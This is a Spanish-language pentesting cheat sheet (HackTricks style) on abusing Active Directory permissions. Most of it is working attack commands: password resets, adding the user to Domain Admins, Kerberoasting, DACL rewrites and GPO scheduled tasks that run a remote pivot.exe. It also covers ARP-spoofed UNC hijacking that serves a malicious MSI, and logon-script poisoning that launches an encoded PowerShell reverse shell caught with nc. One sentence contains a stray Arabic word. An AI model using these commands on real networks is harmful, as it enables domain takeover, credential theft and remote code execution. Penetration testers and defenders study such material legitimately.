# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Esta página es en su mayoría un resumen de las técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **y** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para más detalles, consulta los artículos originales.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Este privilegio le otorga a un atacante control total sobre una cuenta de usuario objetivo. Una vez que los derechos `GenericAll` se confirman usando el comando `Get-ObjectAcl`, un atacante puede:

- **Cambiar la contraseña del objetivo**: Usando `net user <username> <password> /domain`, el atacante puede restablecer la contraseña del usuario.
- Desde Linux, puedes hacer lo mismo sobre SAMR con Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Si la cuenta está deshabilitada, borra el flag UAC**: `GenericAll` permite editar `userAccountControl`. Desde Linux, BloodyAD puede eliminar el flag `ACCOUNTDISABLE`:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Asigna un SPN a la cuenta del usuario para hacerla kerberoasteable, luego usa Rubeus y targetedKerberoast.py para extraer e intentar crackear los hashes del ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Deshabilitar la preautenticación para el usuario, haciendo que su cuenta sea vulnerable a ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Con `GenericAll` en un usuario puedes agregar una credencial basada en certificado y autenticarte como él sin cambiar su contraseña. Ver:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

Este privilegio permite a un atacante manipular membresías de grupos si tiene derechos `GenericAll` sobre un grupo como `Domain Admins`. Después de identificar el distinguished name del grupo con `Get-NetGroup`, el atacante puede:

- **Add Themselves to the Domain Admins Group**: Esto se puede hacer mediante comandos directos o usando módulos como Active Directory o PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Desde Linux también puedes aprovechar BloodyAD para agregarte a ti mismo en grupos arbitrarios cuando tengas GenericAll/Write membership sobre ellos. Si el grupo objetivo está anidado en “Remote Management Users”, obtendrás acceso WinRM inmediatamente en los hosts que respeten ese grupo:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Tener estos privilegios sobre un objeto de computadora o una cuenta de usuario permite:

- **Kerberos Resource-based Constrained Delegation**: Permite tomar control de un objeto de computadora.
- **Shadow Credentials**: Usa esta técnica para suplantar una cuenta de computadora o de usuario explotando los privilegios para crear shadow credentials.

## **WriteProperty on Group**

Si un usuario tiene derechos `WriteProperty` sobre todos los objetos de un grupo específico (por ejemplo, `Domain Admins`), puede:

- **Añadirse al grupo Domain Admins**: Se puede lograr combinando los comandos `net user` y `Add-NetGroupUser`, este método permite escalada de privilegios dentro del dominio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Auto-pertenencia) en Group**

Este privilegio permite a los atacantes añadirse a sí mismos a grupos específicos, como `Domain Admins`, mediante comandos que manipulan directamente la pertenencia al grupo. Usar la siguiente secuencia de comandos permite la auto-adición:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Autopertenencia)**

Un privilegio similar, esto permite a los atacantes agregarse directamente a grupos modificando las propiedades del grupo si tienen el derecho `WriteProperty` sobre esos grupos. La confirmación y ejecución de este privilegio se realizan con:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Tener `ExtendedRight` sobre un usuario para `User-Force-Change-Password` permite restablecer contraseñas sin conocer la contraseña actual. La verificación de este derecho y su explotación pueden hacerse mediante PowerShell o herramientas de línea de comandos alternativas, ofreciendo varios métodos para restablecer la contraseña de un usuario, incluidas sesiones interactivas y one-liners para entornos no interactivos. Los comandos van desde invocaciones simples de PowerShell hasta el uso de `rpcclient` en Linux, demostrando la versatilidad de los vectores de ataque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Si un atacante descubre que tiene permisos `WriteOwner` sobre un grupo, puede cambiar la propiedad del grupo a sí mismo. Esto es especialmente impactante cuando el grupo en cuestión es `Domain Admins`, ya que cambiar la propiedad permite un control más amplio sobre los atributos y la membresía del grupo. El proceso implica identificar el objeto correcto mediante `Get-ObjectAcl` y luego usar `Set-DomainObjectOwner` para modificar el propietario, ya sea por SID o por nombre.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Este permiso permite a un atacante modificar las propiedades del usuario. En concreto, con acceso `GenericWrite`, el atacante puede cambiar la ruta del logon script de un usuario para ejecutar un script malicioso al iniciar sesión. Esto se logra usando el comando `Set-ADObject` para actualizar la propiedad `scriptpath` del usuario objetivo y hacer que apunte al script del atacante.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite en Group**

Con este privilegio, los atacantes pueden manipular la membresía de un grupo, como agregarse a sí mismos u otros usuarios a grupos específicos. Este proceso implica crear un objeto de credencial, usarlo para agregar o eliminar usuarios de un grupo y verificar los cambios de membresía con comandos de PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Desde Linux, Samba `net` puede agregar/quitar miembros cuando tienes `GenericWrite` sobre el grupo (útil cuando PowerShell/RSAT no están disponibles):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Poseer un objeto de AD y tener privilegios `WriteDACL` sobre él permite a un atacante concederse a sí mismo privilegios `GenericAll` sobre el objeto. Esto se logra mediante la manipulación de ADSI, permitiendo control total sobre el objeto y la capacidad de modificar sus membresías de grupo. A pesar de esto, existen limitaciones al intentar explotar estos privilegios usando los cmdlets `Set-Acl` / `Get-Acl` del módulo de Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

Cuando tienes `WriteOwner` y `WriteDacl` sobre un usuario o cuenta de servicio, puedes tomar el control total y restablecer su contraseña usando PowerView sin conocer la contraseña القديمة:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notas:
- Puede que necesites primero cambiar el owner a ti mismo si solo tienes `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validar acceso con cualquier protocolo (SMB/LDAP/RDP/WinRM) después de resetear la contraseña.

## **Replication on the Domain (DCSync)**

El ataque DCSync aprovecha permisos específicos de replicación en el dominio para imitar a un Domain Controller y sincronizar datos, incluidas credenciales de usuario. Esta potente técnica requiere permisos como `DS-Replication-Get-Changes`, lo que permite a los atacantes extraer información sensible del entorno AD sin acceso directo a un Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

El acceso delegado para administrar Group Policy Objects (GPOs) puede presentar riesgos de seguridad significativos. Por ejemplo, si a un usuario como `offense\spotless` se le delegan permisos de administración de GPO, puede tener privilegios como **WriteProperty**, **WriteDacl** y **WriteOwner**. Estos permisos pueden abusarse con fines maliciosos, como se identifica usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Para identificar GPOs mal configurados, se pueden encadenar los cmdlets de PowerSploit. Esto permite descubrir GPOs que un usuario específico tiene permisos para administrar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Es posible resolver a qué computadoras se aplica un GPO específico, lo que ayuda a entender el alcance del impacto potencial. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Para ver qué políticas se aplican a una computadora concreta, se pueden utilizar comandos como `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Identificar las organizational units (OUs) afectadas por una política dada se puede hacer usando `Get-DomainOU`.

También puedes usar la herramienta [**GPOHound**](https://github.com/cogiceo/GPOHound) para enumerar GPOs y encontrar problemas en ellas.

### Abuse GPO - New-GPOImmediateTask

Los GPOs mal configurados pueden explotarse para ejecutar código, por ejemplo, creando una tarea programada inmediata. Esto puede hacerse para agregar un usuario al grupo de administradores locales en las máquinas afectadas, elevando privilegios significativamente:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

El módulo GroupPolicy, si está instalado, permite crear y enlazar nuevos GPOs, y establecer preferencias como valores de registry para ejecutar backdoors en los equipos afectados. Este método requiere que el GPO se actualice y que un usuario inicie sesión en el equipo para su ejecución:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse ofrece un método para abuse de GPOs existentes añadiendo tareas o modificando configuraciones sin necesidad de crear nuevos GPOs. Esta herramienta requiere modificar GPOs existentes o usar herramientas RSAT para crear nuevos antes de aplicar cambios:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forzar actualización de directiva

Las actualizaciones de GPO suelen ocurrir aproximadamente cada 90 minutos. Para acelerar este proceso, especialmente después de implementar un cambio, se puede usar el comando `gpupdate /force` en el equipo objetivo para forzar una actualización inmediata de la directiva. Este comando garantiza que cualquier modificación en las GPO se aplique sin esperar al siguiente ciclo automático de actualización.

### Bajo el capó

Al inspeccionar las Scheduled Tasks de una GPO determinada, como la `Misconfigured Policy`, se puede confirmar la adición de tareas como `evilTask`. Estas tareas se crean mediante scripts o herramientas de línea de comandos con el objetivo de modificar el comportamiento del sistema o escalar privilegios.

La estructura de la tarea, como se muestra en el archivo de configuración XML generado por `New-GPOImmediateTask`, detalla los aspectos específicos de la scheduled task, incluyendo el comando que se ejecutará y sus triggers. Este archivo representa cómo se definen y administran las scheduled tasks dentro de las GPO, proporcionando un método para ejecutar comandos o scripts arbitrarios como parte de la aplicación de la directiva.

### Users and Groups

Las GPO también permiten manipular las membresías de usuarios y grupos en los sistemas objetivo. Editando directamente los archivos de la directiva Users and Groups, los atacantes pueden añadir usuarios a grupos privilegiados, como el grupo local `administrators`. Esto es posible mediante la delegación de permisos de administración de GPO, que permite modificar los archivos de directiva para incluir nuevos usuarios o cambiar las membresías de grupo.

El archivo de configuración XML para Users and Groups describe cómo se implementan estos cambios. Al añadir entradas a este archivo, se pueden conceder privilegios elevados a usuarios específicos en los sistemas afectados. Este método ofrece un enfoque directo para la escalada de privilegios mediante la manipulación de GPO.

Además, también pueden considerarse otros métodos para ejecutar código o mantener persistence, como aprovechar scripts de logon/logoff, modificar claves de registro para autoruns, instalar software mediante archivos .msi o editar configuraciones de servicios. Estas técnicas ofrecen varias vías para mantener acceso y controlar sistemas objetivo mediante el abuso de GPO.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` sobre una OU/domain te permite modificar el atributo `gPLink` del contenedor objetivo y **forzar la aplicación de una GPO existente** sin editar la propia GPO. Esto resulta interesante cuando la GPO vinculada ya referencia contenido remoto mediante **UNC paths** (`\\HOST\share\...`), porque los usuarios autenticados pueden leer **SYSVOL** y buscar políticas reutilizables offline.

Flujo de trabajo de alto nivel:

1. Usa BloodHound para identificar un principal con `WriteGPLink` sobre una OU y enumerar computadoras/usuarios dentro de esa OU.
2. Clona `SYSVOL` en modo solo lectura y analiza GPOs buscando **Software Installation**, **drive mappings** (`Drives.xml`) y **logon/startup scripts** que referencien UNC paths.
3. Da preferencia a políticas que apunten a un **direct hostname** (por ejemplo `\\DC02\share\pkg.msi`) en lugar de rutas DFS/domain-namespace, porque las rutas basadas en hostname son más fáciles de redirigir con L2 spoofing.
4. Añade el GUID de la GPO elegida al `gPLink` de la OU objetivo para que la víctima procese esa directiva ya existente.
5. En el mismo broadcast domain, haz ARP spoofing del host UNC y enlaza su IP localmente (`ip addr add <target_ip>/32 dev <iface>`) para que el tráfico SMB de la víctima llegue a tu host.
6. Sirve la ruta/nombre de archivo esperados desde un servidor SMB del atacante (por ejemplo `smbserver.py`) y espera el procesamiento normal de la directiva.

Ejemplo de recopilación de `SYSVOL` y correlación de GPO:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Vincula la GPO existente a la OU objetivo:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Instalación de software UNC hijack -> SYSTEM

Si el GPO enlazado despliega un MSI desde una ruta UNC, el cliente lo obtendrá durante el **inicio del equipo** y lo instalará como **`NT AUTHORITY\SYSTEM`**. Suplantando el host referenciado y sirviendo un MSI malicioso bajo el **mismo share/path/name**, puedes convertir `WriteGPLink` en ejecución de código como SYSTEM **sin modificar SYSVOL**.

Restricciones importantes:

- **El timing importa**: el nuevo enlace se observa en el policy refresh (normalmente ~90 minutos), pero **Software Installation** suele activarse con el **reboot**.
- Windows Installer normalmente hace seguimiento del despliegue usando el **`ProductCode`** del paquete. Si el producto ya está instalado, el despliegue puede omitirse.
- Para evitar el rechazo del instalador, parchea el MSI malicioso para que su **`ProductCode`** y **`PackageCode`** coincidan con el paquete legítimo esperado por el GPO.
- Los antiguos archivos `.aas` de advertisement pueden permanecer en `SYSVOL`, así que valida que el despliegue siga pareciendo activo antes de confiar en él.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Las asignaciones de unidades GPP en `Drives.xml` hacen que los usuarios se autentiquen en la ruta UNC configurada durante el logon o la reconexión. Si suplantas el host referenciado, puedes capturar **NetNTLMv2**. Si haces que SMB falle deliberadamente, Windows puede reintentar por **WebDAV**, enviando **NTLM over HTTP**, que es mucho más flexible para relays a **LDAP(S)**, **AD CS**, o **SMB**.

#### Logon/startup script UNC hijack

El mismo patrón se aplica a scripts alojados en UNC descubiertos en `SYSVOL`:

- Los **Logon scripts** normalmente se ejecutan en el contexto del **user**.
- Los **Startup scripts** normalmente se ejecutan en el contexto del **computer / SYSTEM**.

Si la ruta del script apunta a un hostname que puede ser suplantado, redirige el host UNC y sirve contenido de script de reemplazo desde la ubicación esperada.

## SYSVOL/NETLOGON Logon Script Poisoning

Las rutas escribibles bajo `\\<dc>\SYSVOL\<domain>\scripts\` o `\\<dc>\NETLOGON\` permiten manipular scripts de logon ejecutados al iniciar sesión mediante GPO. Esto produce ejecución de código en el contexto de seguridad de los usuarios que inician sesión.

### Locate logon scripts
- Inspecciona los atributos del usuario para un logon script configurado:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Rastrea los shares del dominio para descubrir accesos directos o referencias a scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analiza archivos `.lnk` para resolver objetivos que apuntan a SYSVOL/NETLOGON (truco útil de DFIR y para atacantes sin acceso directo a GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound muestra el atributo `logonScript` (scriptPath) en los nodos de usuario cuando está presente.

### Validar acceso de escritura (no confíes en los listados de shares)
Las herramientas automatizadas pueden mostrar SYSVOL/NETLOGON como solo lectura, pero los ACLs NTFS subyacentes aún pueden permitir escritura. Siempre prueba:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Si el tamaño del archivo o el mtime cambian, tienes write. Preserva los originales antes de modificar.

### Envenena un script de inicio de sesión VBScript para RCE
Añade un comando que lance un reverse shell de PowerShell (genéralo desde revshells.com) y conserva la lógica original para evitar romper la función de negocio:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Escucha en tu host y espera al siguiente inicio de sesión interactivo:
```bash
rlwrap -cAr nc -lnvp 443
```
Notas:
- La ejecución ocurre bajo el token del usuario que registra (no SYSTEM). El scope es el enlace de GPO (OU, site, domain) que aplica ese script.
- Limpia restaurando el contenido/los timestamps originales después de usarlo.


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
